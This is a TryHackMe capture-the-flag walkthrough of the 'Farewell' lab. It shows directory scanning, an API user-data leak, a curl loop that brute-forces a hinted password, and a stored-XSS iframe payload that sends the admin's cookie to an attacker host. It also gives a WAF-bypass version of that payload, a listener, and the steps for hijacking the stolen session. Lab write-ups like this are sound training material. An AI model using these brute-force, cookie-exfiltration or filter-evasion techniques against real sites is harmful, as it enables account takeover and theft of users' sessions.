# TryHackMe---Farewell-Full-Walkthrough

Farewell is a vulnerable web application on TryHackMe designed around two core weaknesses:
Weak API exposure
Stored XSS on an admin‑reviewed message system
The ultimate goal is to escalate from a normal user to the admin panel and retrieve the flags.

This write‑up contains all enumeration steps, scripts used, Gobuster scanning, brute‑force methodology, XSS payload construction, WAF bypass, and final exploitation.

✔ Gobuster Scan
To discover hidden directories:

gobuster dir -u http://YOUR_IP/ -w /usr/share/wordlists/dirb/common.txt
Key results (add your screenshot here):

/index.php
/dashboard.php
/admin.php
/api/ (discovered later)
/farewell.php
Press enter or click to view image in full size

🌐 2. Exploring the Website
Main findings:
A login page with username/password fields
A “Farewell message” functionality (user-submitted)
An admin login area (/admin.php)
No direct clue for user credentials
This suggests there must be an API endpoint or weak authentication.

🛰️ 3. API Enumeration
Using curl to test API routes:

curl -s http://YOUR_IP/api/
Testing user enumeration:

curl -s "http://YOUR_IP/api/user?name=adam"
This returned:

{
    "error": "auth_failed",
    "user": {
        "name": "deliver11",
        "last_password_change": "2025-09-10 11:00:00",
        "password_hint": "Capital of Japan followed by 4 digits"
    }
}
🔥 This leak gives us:

Username: deliver11
Password hint: Tokyo + 4 digits
🔐 4. Brute‑forcing the User Password
Since the hint clearly says:
Password = TokyoXXXX

We brute-forced 0000–9999:

for i in {0000..9999}; do
  pass="Tokyo$i"
  echo "[+] Trying $pass"
  res=$(curl -s -X POST "http://YOUR_IP/index.php" \
  -d "username=deliver11&password=$pass")
  echo "$res" | grep -q '"success": true' && echo "[FOUND] $pass" && break
done
Result:

[FOUND] Tokyo****

🎉 5. User Login & User Flag
Using:

Username: deliver11
Password: Tokyo****
After login, the dashboard reveals Flag 1.

Press enter or click to view image in full size

🧨 6. Finding XSS Injection Point
Inside the user dashboard, users can submit a farewell message.

Every message must be reviewed by the admin, making it the perfect target for:

Stored XSS
Auto‑executed payload
Admin cookie theft
Testing HTML injection:

<b>test</b>
It got saved → HTML executed → Vulnerable.

🔥 7. Building the Cookie‑Stealing Payload
Basic idea:

Use an <iframe> that triggers JS
Redirect the admin’s browser to our machine
Append their cookie in the URL
Raw payload (blocked by WAF):
<iframe src="javascript:location='//ATTACKER_IP:9000/'+document.cookie">
WAF‑Bypassed Payload (working):
<iframe src="java&#115;cript:location='//10.201.94.113:9000/'+top['doc'+'ument']['coo'+'kie']">
Why it works:

TechniquePurposejava&#115;criptEncoded “javascript” to bypass filtertop['doc'+'ument']Bypasses “document” keyword blacklist['coo'+'kie']Bypasses “cookie” blacklistRedirect to attacker serverExfiltrates session ID

8. Setting Up Listener for Cookie Capture
Your attack machine IP from TryHackMe AttackBox:

<YOUR_MACHINE_IP>
Start listener:

python3 -m http.server 9000
After the admin reviews your message, you will receive:

GET /PHPSESSID=YOUR_COOKIE HTTP/1.1
Which contains the admin’s session cookie.

Press enter or click to view image in full size

🔓 9. Using the Stolen Admin Session
Steps:

Open browser → DevTools → Application → Cookies
Replace the PHPSESSID with admin’s value
Refresh /admin.php
The admin dashboard loads instantly.

🏁 10. Final Flag
Inside admin panel:

THM{REDUCTED}
Press enter or click to view image in full size

Mission complete 🚩🔥





